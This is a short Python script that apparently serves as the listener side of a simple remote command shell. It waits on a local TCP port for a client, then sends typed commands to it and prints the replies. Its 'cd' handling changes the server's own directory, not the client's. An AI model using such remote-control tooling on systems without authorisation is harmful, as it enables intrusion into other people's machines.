from socket import *
import os
# Server IP and port
ip = "127.0.0.1"
port = 1234
# Connection to server
connection = socket(AF_INET, SOCK_STREAM)
connection.bind((ip, port))

connection.listen(1)


print("Waiting for connection...")
client, addr = connection.accept()
print ("Connect ->"+ str(addr))

while True:
    try:
        receiver = client.recv(1024).decode()
        print(receiver)
        cmd = input("Enter your commands: ").strip()
        if not cmd:
            print("Command cannot be empty.")
            continue
# For server commands
        if cmd[:2] == "cd":
            try:
                os.chdir(cmd[3:])
                print(f"Changed directory to: {os.getcwd()}")
            except Exception as e:
                client.send(f"Error changing directory: {e}".encode())
            continue

            
        if cmd == "exit":
            client.send(cmd.encode())
            print("Exiting server")
            break

        client.send(cmd.encode())
    
    except Exception as e:
        print(f"Error: {e}")
        break  
client.close()
connection.close() 